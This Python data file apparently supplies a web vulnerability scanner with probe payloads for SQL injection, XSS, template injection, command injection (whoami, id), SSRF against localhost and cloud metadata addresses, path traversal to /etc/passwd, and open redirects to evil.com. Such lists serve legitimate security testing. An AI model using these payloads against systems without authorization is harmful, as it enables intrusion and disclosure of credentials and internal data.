"""Payload 数据 — SQLi/XSS/SSTI/CMDI/SSRF/LFI/重定向"""

# ============================================================
# SQL 注入检测 Payload
# ============================================================
SQLI_PAYLOADS = [
    # 报错注入
    {"payload": "'",                        "type": "error_based"},
    {"payload": "\"",                       "type": "error_based"},
    {"payload": "' OR 1=1 -- ",             "type": "boolean"},
    {"payload": "' OR '1'='1",              "type": "boolean"},
    {"payload": "' OR 1=1#",                "type": "boolean"},
    {"payload": "\" OR 1=1 -- ",            "type": "boolean"},
    {"payload": "1' AND '1'='1",            "type": "boolean"},
    {"payload": "1' AND '1'='2",            "type": "boolean"},
    {"payload": "' AND 1=1 -- ",            "type": "boolean"},
    {"payload": "' AND 1=2 -- ",            "type": "boolean"},
    # 时间盲注
    {"payload": "' AND SLEEP(3) -- ",       "type": "time_based"},
    {"payload": "' WAITFOR DELAY '0:0:3' -- ", "type": "time_based"},
    {"payload": "'; WAITFOR DELAY '0:0:3' -- ", "type": "time_based"},
    {"payload": "' AND pg_sleep(3) -- ",    "type": "time_based"},
    {"payload": "' AND BENCHMARK(5000000,MD5(1)) -- ", "type": "time_based"},
    {"payload": "' OR IF(1=1,SLEEP(3),0) -- ", "type": "time_based"},
    # 联合查询
    {"payload": "' UNION SELECT NULL -- ",  "type": "union"},
    {"payload": "' UNION SELECT 1,2,3 -- ", "type": "union"},
    {"payload": "1 UNION SELECT 1,2,3 #",   "type": "union"},
    # 报错函数
    {"payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()))) -- ", "type": "error_based"},
    {"payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT USER())),1) -- ",  "type": "error_based"},
    {"payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT USER()),0x7e,FLOOR(RAND()*2))a FROM INFORMATION_SCHEMA.PLUGINS GROUP BY a)b) -- ", "type": "error_based"},
]

# ============================================================
# XSS Payload
# ============================================================
XSS_PAYLOADS = [
    {"payload": "<script>alert(1)</script>",                    "type": "reflected"},
    {"payload": "<img src=x onerror=alert(1)>",                 "type": "reflected"},
    {"payload": "<svg onload=alert(1)>",                        "type": "reflected"},
    {"payload": "\"><script>alert(1)</script>",                 "type": "reflected"},
    {"payload": "'><script>alert(1)</script>",                  "type": "reflected"},
    {"payload": "';alert(1);//",                                "type": "reflected"},
    {"payload": "\"><img src=x onerror=alert(1)>",              "type": "reflected"},
    {"payload": "<body onload=alert(1)>",                       "type": "reflected"},
    {"payload": "<input onfocus=alert(1) autofocus>",           "type": "reflected"},
    {"payload": "<details open ontoggle=alert(1)>",             "type": "reflected"},
    {"payload": "<select autofocus onfocus=alert(1)>",          "type": "reflected"},
    {"payload": "<textarea autofocus onfocus=alert(1)>",        "type": "reflected"},
    {"payload": "<keygen autofocus onfocus=alert(1)>",          "type": "reflected"},
    {"payload": "<marquee onstart=alert(1)>",                   "type": "reflected"},
    {"payload": "<video><source onerror=alert(1)>",             "type": "reflected"},
    {"payload": "<audio><source onerror=alert(1)>",             "type": "reflected"},
    {"payload": "javascript:alert(1)",                          "type": "reflected"},
]

# ============================================================
# SSTI Payload
# ============================================================
SSTI_PAYLOADS = [
    {"payload": "{{7*7}}",                      "engine": "通用"},
    {"payload": "${7*7}",                       "engine": "通用"},
    {"payload": "#{7*7}",                       "engine": "通用"},
    {"payload": "*{7*7}",                       "engine": "通用"},
    {"payload": "{{7*'7'}}",                    "engine": "Jinja2/Twig"},
    {"payload": "<%= 7*7 %>",                   "engine": "ERB"},
    {"payload": "${{7*7}}",                     "engine": "Velocity"},
    {"payload": "#set($x=7*7)$x",               "engine": "Velocity"},
    {"payload": "${7*7}",                       "engine": "Freemarker"},
    {"payload": "{{7*7}}",                      "engine": "Jinja2"},
    {"payload": "{{config}}",                   "engine": "Jinja2"},
    {"payload": "{$smarty.version}",            "engine": "Smarty"},
    {"payload": "{{7*7}}",                      "engine": "Nunjucks"},
    {"payload": "{{7*7}}",                      "engine": "Jade/Pug"},
    {"payload": "{%%20SET%%20@a=7*7}",          "engine": "Mako"},
]

# ============================================================
# 命令注入 Payload
# ============================================================
CMDI_PAYLOADS = [
    {"payload": "; ping -c 3 127.0.0.1",        "type": "time_based"},
    {"payload": "| ping -c 3 127.0.0.1",        "type": "time_based"},
    {"payload": "& ping -c 3 127.0.0.1 &",      "type": "time_based"},
    {"payload": "&& ping -c 3 127.0.0.1",       "type": "time_based"},
    {"payload": "`ping -c 3 127.0.0.1`",        "type": "time_based"},
    {"payload": "$(ping -c 3 127.0.0.1)",       "type": "time_based"},
    {"payload": "; echo xuanmu_test_$(whoami)",  "type": "output"},
    {"payload": "| echo xuanmu_test_$(whoami)",  "type": "output"},
    {"payload": "`echo xuanmu_test_$(whoami)`",  "type": "output"},
    {"payload": "; id",                          "type": "output"},
    {"payload": "| id",                          "type": "output"},
    {"payload": "& dir &",                       "type": "output"},
]

# ============================================================
# SSRF Payload
# ============================================================
SSRF_PAYLOADS = [
    "http://127.0.0.1:80",
    "http://localhost:80",
    "http://0.0.0.0:80",
    "http://[::]:80",
    "http://0:80",
    "http://127.0.0.1:443",
    "http://localhost:443",
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:6379",
    "http://127.0.0.1:27017",
    "http://127.1:80",
    "http://2130706433:80",
    "http://0x7f000001:80",
    "http://017700000001:80",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "dict://127.0.0.1:6379",
    "gopher://127.0.0.1:6379",
    "http://169.254.169.254/latest/meta-data/",
    "http://100.100.100.200/latest/meta-data/",
    "http://metadata.google.internal/",
]

# ============================================================
# 路径遍历 Payload
# ============================================================
LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "....//....//....//....//etc/passwd",
    "../../../../etc/passwd%00",
    "../../../../etc/passwd%2500",
    "../.../../.../../etc/passwd",
    "..;/..;/..;/etc/passwd",
    "file=php://filter/convert.base64-encode/resource=index",
]

# ============================================================
# 开放重定向 Payload
# ============================================================
REDIRECT_PAYLOADS = [
    "//evil.com",
    "https://evil.com",
    "http://evil.com",
    "//evil.com%2f@",
    "\\\\evil.com",
    "/\\evil.com",
    "https:evil.com",
    "http://evil.com:80%40",
    "javascript:alert(1)",
]
